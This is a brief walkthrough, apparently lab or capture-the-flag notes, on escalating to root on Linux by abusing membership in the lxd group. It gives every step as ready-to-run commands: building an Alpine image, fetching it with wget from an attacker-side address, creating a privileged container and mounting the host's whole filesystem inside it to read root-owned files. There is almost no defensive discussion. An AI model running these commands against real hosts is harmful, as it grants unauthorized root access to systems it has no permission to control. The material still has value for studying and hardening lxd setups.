
Being part of the lxd group is effectively root-level access. It let's us manage lxc/lxd containers, and a container can be told to mount the host's entire filesystem. So from inside the container we control, we can reach files owned by root.

---

We'll use the following container builder.

```
git clone https://github.com/saghul/lxd-alpine-builder.git  
cd lxd-alpine-builder  
sudo ./build-alpine  
```

1. Upload it to target machine

```
wget http://10.10.14.44/alpine-v3.13-x86_64-20210218_0139.tar.gz alpine-v3.13-x86_64-20210218_0139.tar.gz
```

2. Create Container Image

**NOTE**: Press enter the whole.
```
lxd init
```

3. Execute the following commands

```
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias hacked
lxc image list
lxc storage create default dir
lxc init hacked container -c security.privileged=true -s default
lxc config device add container mydevice disk source=/ path=/mnt/root recursive=true
lxc start container
lxc exec container /bin/sh
```

Since we mounted the entire filesystem into the container, we can now view the root directory inside /mnt/root.

```
cd /mnt/root
```